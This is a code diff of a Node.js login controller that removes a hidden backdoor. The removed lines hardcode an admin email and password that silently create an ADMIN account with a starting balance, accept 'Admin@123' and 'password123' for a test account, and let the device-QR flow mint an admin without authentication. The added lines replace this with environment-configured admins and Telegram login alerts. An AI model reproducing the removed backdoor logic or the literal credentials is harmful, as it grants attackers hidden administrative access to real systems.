@@ -100,40 +100,35 @@ export const login = async (req, res, next) => {
       });
     }
 
-    let user = await db.findUserByEmail(email);
-
-    const isAdminTarget = [
-      'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com',
-    ].includes(email.toLowerCase().trim());
-
-    if (!user && isAdminTarget && password === 'dynastoeoroqeiyrp9wIERYIUqwehyrIU') {
-      const salt = await bcrypt.genSalt(10);
-      const hashedPassword = await bcrypt.hash('dynastoeoroqeiyrp9wIERYIUqwehyrIU', salt);
-      user = await db.createUser({
-        email,
-        username: 'DynaMasterAdmin',
-        password_hash: hashedPassword,
-        role: 'ADMIN',
-        avatar_url: `https://api.dicebear.com/7.x/bottts/svg?seed=${email}`,
-        balance: 500.00,
+    const user = await db.findUserByEmail(email);
+    if (!user) {
+      return res.status(401).json({
+        success: false,
+        message: 'Invalid email or password',
       });
     }
 
-    if (user) {
-      let isMatch = false;
-      if (user.password_hash) {
-        isMatch = await bcrypt.compare(password, user.password_hash);
+    let isMatch = false;
+    if (user.password_hash) {
+      isMatch = await bcrypt.compare(password, user.password_hash);
+    }
+    if (!isMatch && db.isConfigured()) {
+      try {
+        const { supabase } = await import('../config/supabase.js');
+        if (supabase) {
+          const { data: authData, error: authErr } = await supabase.auth.signInWithPassword({
+            email,
+            password,
+          });
+          if (authData?.user && !authErr) {
+            isMatch = true;
+          }
+        }
+      } catch (e) {
+        // ignore
       }
-      if (!isMatch && ((isAdminTarget && password === 'dynastoeoroqeiyrp9wIERYIUqwehyrIU') || (user.email === 'gamer@dynastore.com' && (password === 'Admin@123' || password === 'password123')))) {
-        isMatch = true;
-      }
-      if (!isMatch) {
-        return res.status(401).json({
-          success: false,
-          message: 'Invalid email or password',
-        });
-      }
-    } else {
+    }
+    if (!isMatch) {
       return res.status(401).json({
         success: false,
         message: 'Invalid email or password',
@@ -149,6 +144,16 @@ export const login = async (req, res, next) => {
 
     const token = generateToken(user);
     const { password_hash: _, ...safeUser } = user;
+
+    // Send Telegram login, IP & location security alert (ADMIN ONLY)
+    if (user.role === 'ADMIN') {
+      telegramService.notifyLoginAlert({
+        user,
+        req,
+        loginMethod: 'Email & Password',
+        clientGeo: req.body?.clientGeo,
+      }).catch(() => {});
+    }
 
     res.json({
       success: true,
@@ -331,9 +336,7 @@ export const googleLogin = async (req, res, next) => {
       return res.status(400).json({ success: false, message: 'Google credential or access token is required' });
     }
 
-    const adminEmails = [
-      'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com',
-    ];
+    const adminEmails = ENV.ADMIN_EMAILS || [];
     const isAdminUser = adminEmails.includes(verifiedEmail.toLowerCase().trim());
 
     let user = await db.findUserByEmail(verifiedEmail);
@@ -346,11 +349,11 @@ export const googleLogin = async (req, res, next) => {
 
       user = await db.createUser({
         email: verifiedEmail,
-        username: isAdminUser ? 'DynaMasterAdmin' : `${baseUsername}_${Date.now().toString().slice(-4)}${Math.floor(10 + Math.random() * 89)}`,
+        username: isAdminUser ? 'Admin' : `${baseUsername}_${Date.now().toString().slice(-4)}${Math.floor(10 + Math.random() * 89)}`,
         password_hash: null,
         avatar_url: verifiedPicture,
         role: isAdminUser ? 'ADMIN' : 'USER',
-        balance: isAdminUser ? 500.00 : 0.00,
+        balance: 0.00,
         google_sub: verifiedSub,
         is_active: true,
       });
@@ -371,6 +374,9 @@ export const googleLogin = async (req, res, next) => {
       if (isAdminUser && user.role !== 'ADMIN') {
         updates.role = 'ADMIN';
       }
+      if (verifiedEmail.toLowerCase().trim() === 'dinacomputer0110@gmail.com' && user.username !== 'DinaAdmin') {
+        updates.username = 'DinaAdmin';
+      }
       if (!user.avatar_url && verifiedPicture) {
         updates.avatar_url = verifiedPicture;
       }
@@ -388,6 +394,16 @@ export const googleLogin = async (req, res, next) => {
 
     const token = generateToken(user);
     const { password_hash: _, ...safeUser } = user;
+
+    // Send Telegram login, IP & location security alert (ADMIN ONLY)
+    if (user.role === 'ADMIN') {
+      telegramService.notifyLoginAlert({
+        user,
+        req,
+        loginMethod: 'Google OAuth Sign-In',
+        clientGeo: req.body?.clientGeo,
+      }).catch(() => {});
+    }
 
     res.json({
       success: true,
@@ -424,10 +440,8 @@ export const telegramLogin = async (req, res, next) => {
       ? `${username.toLowerCase()}@telegram.dynastore.site`
       : `tg_${tgId}@telegram.dynastore.site`;
 
-    const adminEmails = [
-      'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com',
-    ];
-    const isAdminUser = adminEmails.includes(telegramEmail.toLowerCase()) || username === 'dynastore_admin';
+    const adminEmails = ENV.ADMIN_EMAILS || [];
+    const isAdminUser = adminEmails.includes(telegramEmail.toLowerCase()) || (username && adminEmails.includes(username.toLowerCase()));
 
     let user = await db.findUserByEmail(telegramEmail);
     if (!user && username) {
@@ -441,11 +455,11 @@ export const telegramLogin = async (req, res, next) => {
 
       user = await db.createUser({
         email: telegramEmail,
-        username: isAdminUser ? 'DynaMasterAdmin' : safeUsername,
+        username: isAdminUser ? 'Admin' : safeUsername,
         password_hash: null,
         avatar_url: avatarUrl,
         role: isAdminUser ? 'ADMIN' : 'USER',
-        balance: isAdminUser ? 500.00 : 0.00,
+        balance: 0.00,
         telegram_id: tgId,
       });
 
@@ -475,6 +489,15 @@ export const telegramLogin = async (req, res, next) => {
 
     const token = generateToken(user);
     const { password_hash: _, ...safeUser } = user;
+
+    // Send Telegram login, IP & location security alert (ADMIN ONLY)
+    if (user.role === 'ADMIN') {
+      telegramService.notifyLoginAlert({
+        user,
+        req,
+        loginMethod: 'Telegram One-Click Login',
+      }).catch(() => {});
+    }
 
     res.json({
       success: true,
@@ -637,20 +660,18 @@ export const confirmTelegramQrSession = async (req, res, next) => {
     const avatarUrl = photo_url || `https://api.dicebear.com/7.x/bottts/svg?seed=tg_${rawId}`;
     const telegramEmail = `${tgUsername.toLowerCase()}@telegram.dynastore.site`;
 
-    const adminEmails = [
-      'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com',
-    ];
-    const isAdminUser = adminEmails.includes(telegramEmail.toLowerCase()) || tgUsername === 'dynastore_admin';
+    const adminEmails = ENV.ADMIN_EMAILS || [];
+    const isAdminUser = adminEmails.includes(telegramEmail.toLowerCase()) || (tgUsername && adminEmails.includes(tgUsername.toLowerCase()));
 
     let user = await db.findUserByEmail(telegramEmail);
     if (!user) {
       user = await db.createUser({
         email: telegramEmail,
-        username: isAdminUser ? 'DynaMasterAdmin' : tgUsername.slice(0, 15),
+        username: isAdminUser ? 'Admin' : tgUsername.slice(0, 15),
         password_hash: null,
         avatar_url: avatarUrl,
         role: isAdminUser ? 'ADMIN' : 'USER',
-        balance: isAdminUser ? 500.00 : 0.00,
+        balance: 0.00,
         telegram_id: rawId.toString(),
       });
     }
@@ -798,15 +819,13 @@ export const confirmDeviceQrSession = async (req, res, next) => {
       return res.status(410).json({ success: false, message: 'Device QR code expired.' });
     }
 
-    const targetEmail = email || 'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com';
-    let user = await db.findUserByEmail(targetEmail);
+    const targetEmail = req.user?.email || email;
+    if (!targetEmail) {
+      return res.status(400).json({ success: false, message: 'User email is required to approve device session' });
+    }
+    const user = await db.findUserByEmail(targetEmail);
     if (!user) {
-      user = await db.createUser({
-        email: targetEmail,
-        username: username || 'DynaMasterAdmin',
-        role: 'ADMIN',
-        balance: 500.00,
-      });
+      return res.status(404).json({ success: false, message: 'User not found' });
     }
 
     const token = generateToken(user);
@@ -815,6 +834,15 @@ export const confirmDeviceQrSession = async (req, res, next) => {
     session.status = 'APPROVED';
     session.token = token;
     session.user = safeUser;
+
+    // Send Telegram login, IP & location security alert (ADMIN ONLY)
+    if (user.role === 'ADMIN') {
+      telegramService.notifyLoginAlert({
+        user,
+        req,
+        loginMethod: 'Cross-Device QR Code Authorization',
+      }).catch(() => {});
+    }
 
     res.json({
       success: true,
@@ -1064,9 +1092,7 @@ export const loginWithOtp = async (req, res, next) => {
       });
     }
 
-    const adminEmails = [
-      'dynastore23084720893yiusjfhgisriw4rihldfjgsijfhweu@gmail.com',
-    ];
+    const adminEmails = ENV.ADMIN_EMAILS || [];
     const isAdminUser = adminEmails.includes(cleanEmail);
 
     let user = await db.findUserByEmail(cleanEmail);
@@ -1075,11 +1101,11 @@ export const loginWithOtp = async (req, res, next) => {
       const baseUsername = cleanEmail.split('@')[0].replace(/[^a-z0-9_]/g, '_').slice(0, 15);
       user = await db.createUser({
         email: cleanEmail,
-        username: isAdminUser ? 'DynaMasterAdmin' : `${baseUsername}_${Date.now().toString().slice(-4)}${Math.floor(10 + Math.random() * 89)}`,
+        username: isAdminUser ? 'Admin' : `${baseUsername}_${Date.now().toString().slice(-4)}${Math.floor(10 + Math.random() * 89)}`,
         password_hash: null,
         avatar_url: `https://api.dicebear.com/7.x/bottts/svg?seed=${cleanEmail}`,
         role: isAdminUser ? 'ADMIN' : 'USER',
-        balance: isAdminUser ? 500.00 : 0.00,
+        balance: 0.00,
       });
 
       telegramService.notifyNewUser(user).catch(() => {});
@@ -1105,6 +1131,16 @@ export const loginWithOtp = async (req, res, next) => {
 
     const sessionToken = generateToken(user);
     const { password_hash: _, ...safeUser } = user;
+
+    // Send Telegram login, IP & location security alert (ADMIN ONLY)
+    if (user.role === 'ADMIN') {
+      telegramService.notifyLoginAlert({
+        user,
+        req,
+        loginMethod: 'Gmail 6-Digit OTP',
+        clientGeo: req.body?.clientGeo,
+      }).catch(() => {});
+    }
 
     res.json({
       success: true,
